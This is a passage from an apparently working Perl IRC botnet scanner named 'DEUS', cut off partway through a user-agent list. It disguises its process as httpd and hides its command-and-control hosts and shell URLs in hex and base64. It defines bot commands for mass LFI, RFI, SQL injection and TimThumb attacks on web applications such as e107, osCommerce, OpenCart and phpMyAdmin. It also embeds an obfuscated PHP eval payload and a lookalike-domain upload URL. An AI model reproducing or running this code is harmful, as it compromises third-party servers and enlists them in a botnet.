#!/usr/bin/perl
#################################################
#                  _,.-----.,_
#               ,-~           ~-.
#             ,^_DEUS  ___^.
#           Y  ,--._    I    _.--.  Y
#           | Y     ~-. | ,-~     Y |
#           | |        }:{        | |
#           j l       / | \       ! l
#        .-~  (__,.--" .^. "--.,__)  ~-.
#       (           / / | \ \           )
#        \.____,   ~  \/"\/  ~   .____,/
#         ^.____                 ____.^
#            | |T ~\  !   !  /~ T| |
#            | |l   _ _ _ _ _   !| |
#            | l \/V V V V V V\/ j |
#            l  \ \|_|_|_|_|_|/ /  !
#             \  \[T T T T T TI/  /
#              \  `^-^-^-^-^-^'  /
#               \               /
#                \.           ,/
#                  "^-.___,-^"
#################################################
#  DEUS                                                                        #
#                                                #
# ————————————————————— #
#  --------------------------------------------------------------------------- #
#################################################
use HTTP::Request;                              #
use HTTP::Request::Common;                      #
use HTTP::Request::Common qw(POST);             #
use URI::Escape;                                #
use LWP::Simple;                                #
use LWP 5.64;                                   #
use LWP::UserAgent;                             #
use Socket;                                     #
use IO::Socket;                                 #
use IO::Socket::INET;                           #
use IO::Select;                                 #
use MIME::Base64;                               #
use Digest::MD5 qw(md5_hex);                    #
#################################################

my $datetime = localtime;

my $fakeproc  = "\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x68\x74\x74\x70\x64";

my $nickname    = "You\[".(int(rand(99999)))."\]abused";
my $ident       = "BoT";
my $channel     = “#xxxscan#";
my $shchn       = “#xxxsshow#";
my $admin       = “xxxTijN";

my @verbindnaar = ("\x4e\x7a\x59\x6c\x4d\x6a\x63\x6c\x5a\x6a\x59\x6c\x5a\x54\x49\x6c\x4d\x7a\x59\x6c\x4d\x6a\x63\x6c\x4f\x54\x59\x6c\x4d\x54\x59\x6c\x4e\x6a\x63\x6c\x4d\x54\x59\x6c\x59\x54\x59\x6c\x5a\x54\x49\x6c\x4d\x7a\x59\x6c\x4d\x6a\x63\x6c\x4f\x54\x59\x6c");

my @deurtje   = ("\x4e\x7a\x4d\x6c\x4e\x6a\x4d\x6c\x4e\x6a\x4d\x6c\x4e\x6a\x4d\x6c","\x4d\x44\x4d\x6c\x4d\x44\x4d\x6c\x4d\x44\x4d\x6c\x4e\x7a\x4d\x6c");

my $nob0dy    = "4,1CraZy8Creation9Zzz ";
my $lfilogo   = "12(4@LFI12)";
my $lfdlogo   = "12(4@LFD12)";
my $rfilogo   = "12(4@RFI12)";
my $e107logo  = "12(4@e10712)";
my $xmllogo   = "12(4@XML12)";
my $sqllogo   = "12(4@SQL12)";
my $oscologo  = "12(4@OSCO12)";
my $cpanlogo  = "12(4@Cpanel12)";
my $zenlogo   = "12(4@ZEN12)";
my $oplogo    = "12(4@OpenCart12)";
my $admlogo   = "12(4@phpMyAdmin12)";
my $ossqllogo = "12(4@OSCO-SQL12)";
my $timlogo   = "12(4@TIMTHUMB12)";
my $pmwilogo  = "12(4@PmWiki12)";

my $lficmd    = '!lfi';
my $lfdcmd    = '!lfd';
my $rficmd    = '!rfi';
my $e107cmd   = '!e107';
my $xmlcmd    = '!xml';
my $sqlcmd    = '!sql';
my $oscocmd   = '!osco';
my $cpancmd   = '!cpan';
my $zencmd    = '@zen';
my $opcmd     = '!op';
my $admcmd    = '!adm';
my $timcmd    = '!tim';
my $pmwicmd   = '!pmw';

my $cmdlfi    = '!cmdlfi';
my $cmde107   = '!cmde107';
my $cmdxml    = '!cmdxml';

my $inject0r  = "\x5a\x6a\x4d\x6c\x4e\x44\x63\x6c\x4f\x44\x63\x6c\x4e\x44\x63\x6c\x5a\x54\x49\x6c\x4e\x44\x63\x6c\x5a\x6a\x59\x6c\x4d\x6a\x59\x6c\x4d\x44\x63\x6c\x5a\x6a\x49\x6c\x4d\x7a\x63\x6c\x4e\x44\x59\x6c\x5a\x6a\x59\x6c\x5a\x44\x59\x6c\x5a\x54\x49\x6c\x5a\x6a\x49\x6c\x5a\x44\x59\x6c\x5a\x6a\x59\x6c\x4d\x7a\x59\x6c\xa\x5a\x54\x49\x6c\x59\x7a\x59\x6c\x4d\x54\x59\x6c\x4e\x44\x63\x6c\x5a\x54\x59\x6c\x4e\x54\x59\x6c\x4d\x6a\x63\x6c\x4e\x44\x59\x6c\x5a\x54\x59\x6c\x4d\x54\x59\x6c\x59\x7a\x59\x6c\x4d\x7a\x63\x6c\x4f\x54\x59\x6c\x4e\x44\x59\x6c\x4f\x54\x59\x6c\x5a\x44\x59\x6c\x5a\x54\x49\x6c\x5a\x44\x59\x6c\x5a\x6a\x59\x6c\xa\x4d\x7a\x59\x6c\x5a\x54\x49\x6c\x4d\x6a\x63\x6c\x4e\x54\x59\x6c\x4e\x7a\x59\x6c\x4e\x7a\x59\x6c\x5a\x6a\x59\x6c\x59\x7a\x59\x6c\x4d\x6a\x59\x6c\x5a\x6a\x49\x6c\x5a\x6a\x49\x6c\x59\x54\x4d\x6c\x4d\x44\x63\x6c\x4e\x44\x63\x6c\x4e\x44\x63\x6c\x4f\x44\x59\x6c";
my $b0tshell  = "\x4e\x44\x63\x6c\x4f\x44\x63\x6c\x4e\x44\x63\x6c\x5a\x54\x49\x6c\x4f\x44\x59\x6c\x4d\x7a\x63\x6c\x5a\x6a\x49\x6c\x4d\x7a\x63\x6c\x4e\x44\x59\x6c\x5a\x6a\x59\x6c\x5a\x44\x59\x6c\x5a\x54\x49\x6c\x5a\x6a\x49\x6c\x5a\x44\x59\x6c\x5a\x6a\x59\x6c\x4d\x7a\x59\x6c\x5a\x54\x49\x6c\x59\x7a\x59\x6c\x4d\x54\x59\x6c\xa\x4e\x44\x63\x6c\x5a\x54\x59\x6c\x4e\x54\x59\x6c\x4d\x6a\x63\x6c\x4e\x44\x59\x6c\x5a\x54\x59\x6c\x4d\x54\x59\x6c\x59\x7a\x59\x6c\x4d\x7a\x63\x6c\x4f\x54\x59\x6c\x4e\x44\x59\x6c\x4f\x54\x59\x6c\x5a\x44\x59\x6c\x5a\x54\x49\x6c\x5a\x44\x59\x6c\x5a\x6a\x59\x6c\x4d\x7a\x59\x6c\x5a\x54\x49\x6c\x4d\x6a\x63\x6c\xa\x4e\x54\x59\x6c\x4e\x7a\x59\x6c\x4e\x7a\x59\x6c\x5a\x6a\x59\x6c\x59\x7a\x59\x6c\x4d\x6a\x59\x6c\x5a\x6a\x49\x6c\x5a\x6a\x49\x6c\x59\x54\x4d\x6c\x4d\x44\x63\x6c\x4e\x44\x63\x6c\x4e\x44\x63\x6c\x4f\x44\x59\x6c";
my $b0tak       = "\x4e\x44\x63\x6c\x4f\x44\x63\x6c\x4e\x44\x63\x6c\x5a\x54\x49\x6c\x4d\x6a\x59\x6c\x4d\x7a\x63\x6c\x5a\x6a\x49\x6c\x4d\x7a\x63\x6c\x4e\x44\x59\x6c\x5a\x6a\x59\x6c\x5a\x44\x59\x6c\x5a\x54\x49\x6c\x5a\x6a\x49\x6c\x5a\x44\x59\x6c\x5a\x6a\x59\x6c\x4d\x7a\x59\x6c\x5a\x54\x49\x6c\x59\x7a\x59\x6c\x4d\x54\x59\x6c\xa\x4e\x44\x63\x6c\x5a\x54\x59\x6c\x4e\x54\x59\x6c\x4d\x6a\x63\x6c\x4e\x44\x59\x6c\x5a\x54\x59\x6c\x4d\x54\x59\x6c\x59\x7a\x59\x6c\x4d\x7a\x63\x6c\x4f\x54\x59\x6c\x4e\x44\x59\x6c\x4f\x54\x59\x6c\x5a\x44\x59\x6c\x5a\x54\x49\x6c\x5a\x44\x59\x6c\x5a\x6a\x59\x6c\x4d\x7a\x59\x6c\x5a\x54\x49\x6c\x4d\x6a\x63\x6c\xa\x4e\x54\x59\x6c\x4e\x7a\x59\x6c\x4e\x7a\x59\x6c\x5a\x6a\x59\x6c\x59\x7a\x59\x6c\x4d\x6a\x59\x6c\x5a\x6a\x49\x6c\x5a\x6a\x49\x6c\x59\x54\x4d\x6c\x4d\x44\x63\x6c\x4e\x44\x63\x6c\x4e\x44\x63\x6c\x4f\x44\x59\x6c";

my $b0tcmd       = 'preg_replace("/.*/e","\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\'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\'\x29\x29\x29\x29\x3b",".");';

# TIMTUMB INJECT URLS - flickr.com - picasa.com - img.youtube.com - wordpress.com - upload.wikimedia.org - photobucket.com - blogger.com
my $blog = "http://blogger.com.midislandrental.com/.mods/";
#my $blog = "http://img.youtube.com.midislandrental.com/.mods/";

my @uagents   = ('Microsoft Internet Explorer/4.0b1 (Windows 95)',
             'Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)',
             'Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)',
             'Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)',
             'Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)',
             'Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)',
             'Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)',
             'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
             'Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
             'Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)',
             'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
             'Mozilla/4.0 (compatible; MSIE 7.0b; Win32)',
             'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)',
             'Microsoft Pocket Internet Explorer/0.6',
             'Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)',
             'MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;',
             'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)',
             'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)',
             'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
             'Advanced Browser (http://www.avantbrowser.com)',
             'Avant Browser (http://www.avantbrowser.com)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
             'Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)',
             'Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)',
             'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
             'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511',
             'Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0',
             'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox',
             'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4',
             'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6',
             'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
             'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4',
             'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
             'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
             'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b',
             'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0',
             'Mozilla/3.0 (OS/2; U)',
             'Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)',
             'Mozilla/4.61 (Macintosh; I; PPC)',
             'Mozilla/4.61 [en] (OS/2; U)',
             'Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)','Mozilla/4.8 [en] (Windows NT 5.0; U)',
             'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
             'msnbot/1.1 (+http://search.msn.com/msnbot.htm)',
             'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
             'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
             'FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)',
             'Gigabot/3.0 (http://www.gigablast.com/spider.html)',
             'gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)',
             'Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12',
             'IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)',
             'Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4',
             'Infoseek SideWinder/2.0B (Linux 2.4 i686)',
             'Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6',
